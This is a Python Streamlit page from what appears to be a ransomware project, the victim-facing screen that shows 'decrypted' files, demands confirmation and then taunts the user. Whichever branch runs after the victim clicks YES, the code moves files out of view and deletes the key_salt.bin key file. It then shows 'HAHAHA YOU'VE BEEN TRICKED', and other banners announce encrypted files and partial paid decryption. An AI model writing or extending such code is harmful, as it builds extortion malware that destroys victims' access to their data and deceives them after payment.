import streamlit as st
import os
import subprocess
import platform
from encrypt import run_encryption
from decrypt import run_decryption

view_files_folder = "view_files"
files = os.listdir(view_files_folder) if os.path.exists(view_files_folder) else []

st.set_page_config(page_title="🔓 View Files", layout="centered", initial_sidebar_state="collapsed")

st.markdown("""
    <style>
    body, .stApp {
        background-color: black;
        color: #FFFFF0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    h1, h2, h3, h4, h5, h6 {
        color: #FFFFF0;
    }

    .stButton button {
        background-color: black;
        color: #3399ff;
        border: 2px solid #000000;
        border-radius: 6px;
        padding: 10px 25px;
        font-size: 16px;
        transition: background-color 0.3s ease, color 0.3s ease;
    }

    .stButton button:hover {
        background-color: #111111;
        border-color: #3399ff;
        color: #66CCFF;
    }

    .stAlert {
        color: red;
    }

    p {
        font-size: 18px;
    }

    a {
        color: white !important;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
        color: #cccccc !important;
    }
    </style>
""", unsafe_allow_html=True)

if files:
    st.subheader("Files")
    for file in files:
        file_path = os.path.join(view_files_folder, file)
        if st.button("📄 " + file):
            if os.path.exists(file_path):
                with open(file_path, "r", encoding="utf-8") as f:
                    file_content = f.read()
                    st.markdown("### 🔓 Decrypted File Content:")
                    st.code(file_content, language="text")
            else:
                st.warning("File not found or decryption not complete yet.")
    st.markdown("""<h2>Can you see your Original data ??</h2>""", unsafe_allow_html=True)
    if st.button("YES"):
        result = run_decryption()
        print(result)
        if result == "Success":
            view_folder = "view_files"
            target_folder = "target_files"
            if os.path.exists(view_folder):
                for file in os.listdir(view_folder):
                    src = os.path.join(view_folder, file)
                    dest = os.path.join(target_folder, file)
                    os.rename(src, dest)

            if os.path.exists("key_salt.bin"):
                os.remove("key_salt.bin")
        view_folder = "view_files"
        target_folder = "target_files"
        if os.path.exists(view_folder):
            for file in os.listdir(view_folder):
                src = os.path.join(view_folder, file)
                dest = os.path.join(target_folder, file)
                os.rename(src, dest)

        if os.path.exists("key_salt.bin"):
            os.remove("key_salt.bin")
        st.markdown("""
        <h2 style='color:red;'>HAHAHA YOU'VE BEEN TRICKED !! ⚠️ YOUR FILES HAVE BEEN MOVED!</h2>
        <p style='font-size:18px;'>You can't access your files anymore</p>
        """, unsafe_allow_html=True)
    if st.button("NO"):
        st.markdown("""
        <h2>If still Encrypted ??</h2>
        <p style='font-size:18px;'>Sorry, it means you only paid for your folder</p>
        <p style='font-size:18px;'>Click below to decrypt your files</p>
        """, unsafe_allow_html=True)
        st.page_link("pages/Decrypt_files.py", label="Decrypt Files here")
else:
    st.info("No files found.")
    st.markdown("""
    <h2 style='color:red;'>⚠️ YOUR FILES AND FOLDER HAVE BEEN ENCRYPTED!</h2>
    <p style='font-size:18px;'>Decrypt them to view.</p>
    """, unsafe_allow_html=True)
    st.page_link("pages/Decrypt_folder.py", label="Decrypt Folder here")
